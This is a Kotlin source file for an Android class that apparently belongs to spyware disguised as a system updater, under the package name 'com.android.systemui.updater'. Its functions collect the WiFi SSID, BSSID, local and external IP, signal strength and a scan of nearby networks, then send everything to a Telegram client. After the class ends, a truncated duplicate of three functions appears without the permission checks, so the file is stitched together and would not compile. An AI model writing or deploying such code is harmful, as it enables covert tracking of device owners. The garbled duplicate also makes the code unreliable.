package com.android.systemui.updater.capabilities

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.wifi.WifiManager
import androidx.core.content.ContextCompat
import com.android.systemui.updater.TelegramClient
import java.net.URL
import java.util.Scanner

class NetworkCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    private fun hasWifiStatePermission(): Boolean {
        return ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_WIFI_STATE) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasChangeWifiStatePermission(): Boolean {
        return ContextCompat.checkSelfPermission(ctx, Manifest.permission.CHANGE_WIFI_STATE) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasLocationPermission(): Boolean {
        return ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
               ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
    }

    fun wifiInfo() {
        if (!hasWifiStatePermission()) {
            telegram.sendText("❌ WiFi state permission denied")
            return
        }
        val sb = StringBuilder("🌐 WiFi Info\n━━━━━━━━━━━━━━━━\n")
        try {
            val wifiManager = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val info = wifiManager.connectionInfo
            val ip = formatIP(info.ipAddress)
            sb.appendLine("SSID: ${info.ssid.replace("\"", "")}")
            sb.appendLine("BSSID: ${info.bssid}")
            sb.appendLine("IP: $ip")
            sb.appendLine("Signal: ${info.rssi} dBm")
        } catch (e: Exception) {
            sb.appendLine("❌ WiFi info unavailable")
        }
        telegram.sendText(sb.toString())
    }

    fun scanNetworks() {
        if (!hasWifiStatePermission() || !hasChangeWifiStatePermission()) {
            telegram.sendText("❌ WiFi permissions denied")
            return
        }
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M && !hasLocationPermission()) {
            telegram.sendText("❌ Location permission required for WiFi scanning on this Android version")
            return
        }
        telegram.sendText("📡 Scanning nearby networks...")
        try {
            val wm = ctx.getSystemService(Context.WIFI_SERVICE) as WifiManager
            wm.startScan()
            Thread.sleep(3000)
            val results = wm.scanResults
            val sb = StringBuilder()
            sb.appendLine("📡 NEARBY NETWORKS (${results.size})")
            sb.appendLine("━━━━━━━━━━━━━━━━━")
            results.sortedByDescending { it.level }.take(30).forEach { ap ->
                val strength = when {
                    ap.level > -50 -> "████"
                    ap.level > -65 -> "███░"
                    ap.level > -75 -> "██░░"
                    else -> "█░░░"
                }
                sb.appendLine("$strength ${ap.SSID} (${ap.level}dBm)")
            }
            telegram.sendText(sb.toString())
        } catch (e: Exception) {
            telegram.sendText("❌ Scan failed: ${e.message}")
        }
    }

    fun externalIP() {
        try {
            val url = URL("https://api.ipify.org")
            val conn = url.openConnection()
            conn.connectTimeout = 5000
            val scanner = Scanner(conn.getInputStream())
            val ip = scanner.nextLine()
            scanner.close()
            telegram.sendText("🌍 External IP: $ip")
        } catch (e: Exception) {
            telegram.sendText("❌ Cannot get external IP: ${e.message}")
        }
    }

    private fun formatIP(ip: Int): String {
        return "${(ip and 0xFF)}.${(ip shr 8 and 0xFF)}.${(ip shr 16 and 0xFF)}.${(ip shr 24 and 0xFF)}"
    }
}
        telegram.sendText(sb.toString())
    }

    fun scanNetworks() {
        telegram.sendText("📡 Scanning nearby networks...")

        try {
            val wm = ctx.getSystemService(Context.WIFI_SERVICE) as WifiManager
            wm.startScan()

            Thread.sleep(3000)

            val results = wm.scanResults
            val sb = StringBuilder()
            sb.appendLine("📡 NEARBY NETWORKS (${results.size})")
            sb.appendLine("━━━━━━━━━━━━━━━━━")

            results.sortedByDescending { it.level }.take(30).forEach { ap ->
                val strength = when {
                    ap.level > -50 -> "████"
                    ap.level > -65 -> "███░"
                    ap.level > -75 -> "██░░"
                    else -> "█░░░"
                }
                sb.appendLine("$strength ${ap.SSID} (${ap.level}dBm)")
            }

            telegram.sendText(sb.toString())
        } catch (e: Exception) {
            telegram.sendText("❌ Scan failed: ${e.message}")
        }
    }

    fun externalIP() {
        try {
            val url = URL("https://api.ipify.org")
            val conn = url.openConnection()
            conn.connectTimeout = 5000
            val scanner = Scanner(conn.getInputStream())
            val ip = scanner.nextLine()
            scanner.close()
            telegram.sendText("🌍 External IP: $ip")
        } catch (e: Exception) {
            telegram.sendText("❌ Cannot get external IP: ${e.message}")
        }
    }

    private fun formatIP(ip: Int): String {
        return "${(ip and 0xFF)}.${(ip shr 8 and 0xFF)}.${(ip shr 16 and 0xFF)}.${(ip shr 24 and 0xFF)}"
    }
}
